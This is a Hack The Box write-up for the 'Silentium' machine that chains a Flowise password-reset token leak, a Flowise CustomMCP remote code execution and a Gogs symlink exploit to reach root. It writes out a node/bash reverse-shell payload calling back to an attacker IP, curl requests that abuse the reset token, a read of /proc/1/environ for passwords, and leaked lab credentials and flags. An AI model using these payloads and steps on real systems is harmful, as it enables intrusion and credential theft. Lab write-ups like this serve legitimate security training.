@@ -1,0 +1,222 @@
+Silentium HTB Writeup – Full Walkthrough (User & Root)
+Machine Name: Silentium
+Difficulty: Easy
+Platform: Hack The Box
+OS: Linux
+Key Techniques: Subdomain Enumeration, CVE-2025-58434 (Flowise Password Reset), CVE-2025-59528 (Flowise CustomMCP RCE), Container Escape via Environment Variables, Port Forwarding, CVE-2025-8110 (Gogs Symlink RCE)
+
+Table of Contents
+Reconnaissance
+
+Initial Foothold – Flowise AI
+
+Subdomain Discovery
+
+Password Reset (CVE-2025-58434)
+
+Remote Code Execution (CVE-2025-59528)
+
+Container Escape to Host (User Flag)
+
+Privilege Escalation to Root
+
+Internal Service Discovery
+
+Gogs RCE (CVE-2025-8110)
+
+Flags Captured
+
+Final Attack Chain Summary
+
+Reconnaissance
+Start with a full port scan of the target:
+
+bash
+nmap -p- -sV -sC -oA silentium_full 10.129.46.17
+Open Ports:
+
+22/tcp – OpenSSH 9.6p1 (Ubuntu)
+
+80/tcp – nginx 1.24.0 (redirects to http://silentium.htb/)
+
+Add the domain to /etc/hosts:
+
+bash
+echo "10.129.46.17 silentium.htb" | sudo tee -a /etc/hosts
+Browsing to http://silentium.htb shows a corporate leadership page mentioning Ben (Head of Financial Systems) and a possible staging environment.
+
+Initial Foothold – Flowise AI
+Subdomain Discovery
+Using ffuf or gobuster for subdomain enumeration reveals staging.silentium.htb:
+
+bash
+ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 0
+Add the subdomain to /etc/hosts:
+
+bash
+echo "10.129.46.17 staging.silentium.htb" | sudo tee -a /etc/hosts
+Visiting http://staging.silentium.htb reveals a Flowise AI login page (version ≤ 3.0.5). Flowise is a low‑code LLM orchestration platform.
+
+Password Reset (CVE-2025-58434)
+Flowise versions prior to 3.0.6 leak the password reset token in the API response. We can abuse this to take over the account of ben@silentium.htb.
+
+1. Request a password reset for Ben:
+
+bash
+curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"user": {"email": "ben@silentium.htb"}}'
+Response (contains tempToken):
+
+json
+{
+  "user": {
+    "email": "ben@silentium.htb",
+    "tempToken": "kQqymDW0w5Y4clsXfFyeUstxZNqePN6z0YEHsnfiCfWhLhQqj0rOeoh7tSyOlqkJ",
+    ...
+  }
+}
+2. Reset the password using the leaked token:
+
+bash
+curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H "Content-Type: application/json" \
+  -d '{
+    "user": {
+      "email": "ben@silentium.htb",
+      "tempToken": "kQqymDW0w5Y4clsXfFyeUstxZNqePN6z0YEHsnfiCfWhLhQqj0rOeoh7tSyOlqkJ",
+      "password": "123456789@nN"
+    }
+  }'
+Now log in at http://staging.silentium.htb with ben@silentium.htb and the new password.
+
+Remote Code Execution (CVE-2025-59528)
+Inside the Flowise dashboard, we can create a CustomMCP node that executes arbitrary system commands due to insufficient input sanitisation.
+
+Steps we took (troubleshooting included):
+
+Obtain Ben's API key from the dashboard (Settings → API Keys):
+hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc
+
+Use a public exploit chain to get a reverse shell without manually building a chatflow.
+The script CVE-2025-58434-59528 automates the RCE.
+
+bash
+git clone https://github.com/TYehan/CVE-2025-58434-59528.git
+cd CVE-2025-58434-59528
+python3 flowise_chain.py -t http://staging.silentium.htb \
+    --api-key hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc \
+    --lhost 10.10.16.39 --lport 4444
+Note: The exploit script may require minor modifications to work out‑of‑the‑box. In our case, the payload needed proper JSON escaping and the inclusion of an LLM chain node to satisfy Flowise's validation. The working payload we used is:
+
+json
+{
+  "command": "node",
+  "args": ["-e", "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.16.39/4444 0>&1\"')"]
+}
+Catch the reverse shell:
+
+bash
+nc -lvnp 4444
+We now have a shell as ben inside a Docker container.
+
+Container Escape to Host (User Flag)
+The initial shell is limited to the Flowise container. We need to break out to the host.
+
+1. Read environment variables from PID 1:
+
+bash
+cat /proc/1/environ | tr '\0' '\n' | grep -i pass
+Output reveals Ben's host password:
+
+text
+FLOWISE_PASSWORD=F1l3_d0ck3r
+SMTP_PASSWORD=r04D!!_R4ge
+BEN_PASSWORD=F1l3_d0ck3r   # <-- This is the SSH password
+2. SSH to the host as ben:
+
+From your attacker machine (not the container):
+
+bash
+ssh ben@10.129.46.17
+# Password: F1l3_d0ck3r
+3. Grab the user flag:
+
+bash
+cat ~/user.txt
+Privilege Escalation to Root
+Internal Service Discovery
+Inside the SSH session, enumerate listening ports:
+
+bash
+ss -tulnp | grep 127.0.0.1
+We find an internal service on port 3001 (and 3000). Visiting http://127.0.0.1:3001 (after port forwarding) reveals Gogs – a self‑hosted Git service, version 0.13.0.
+
+Gogs RCE (CVE-2025-8110)
+Gogs 0.13.0 is vulnerable to a symlink race condition that allows writing arbitrary files, leading to remote code execution via Git hooks.
+
+1. Port forward Gogs to your local machine:
+
+bash
+ssh -L 3001:127.0.0.1:3001 ben@10.129.46.17
+Keep this SSH session open.
+
+2. Access Gogs at http://localhost:3001.
+Register a new account (e.g., kabir:kabir).
+Generate an API token: Settings → Applications → Generate Token.
+
+3. Start a second netcat listener for the root shell:
+
+bash
+nc -lvnp 5555
+4. Run the Gogs RCE exploit (CVE-2025-8110-Gogs-RCE-Exploit):
+
+bash
+git clone https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit.git
+cd CVE-2025-8110-Gogs-RCE-Exploit
+pip3 install requests rich beautifulsoup4
+python3 exploit.py -u http://localhost:3001 \
+    -un kabir -pw kabir \
+    -t 8e18539756d37fd37c5a34e65a772f7c5e487e1a \
+    -lh 10.10.16.39 -lp 5555
+5. Catch the root shell:
+
+On your netcat listener (port 5555), you will receive a connection as root. Grab the flag:
+
+bash
+cat /root/root.txt
+Flags Captured
+User flag: [REDACTED]
+
+Root flag: eef4f3e25d08ad864bd4ce11501205b1
+
+Final Attack Chain Summary
+Nmap → open ports 22 (SSH) and 80 (HTTP)
+
+Subdomain enum → discover staging.silentium.htb (Flowise AI)
+
+CVE-2025-58434 → reset ben@silentium.htb password, login
+
+CVE-2025-59528 → CustomMCP node RCE → reverse shell inside Docker container
+
+Container escape → read /proc/1/environ → obtain Ben's host password
+
+SSH as ben → user flag
+
+Internal scan → find Gogs on 127.0.0.1:3001
+
+Port forward → access Gogs, register account, get API token
+
+CVE-2025-8110 → symlink RCE → root shell → root flag
+
+References & Credits
+Flowise Password Reset Leak (CVE-2025-58434)
+
+Flowise CustomMCP RCE (CVE-2025-59528)
+
+Gogs Symlink RCE (CVE-2025-8110)
+
+Exploit scripts by TYehan
+
+Hack The Box for the awesome lab environment
+
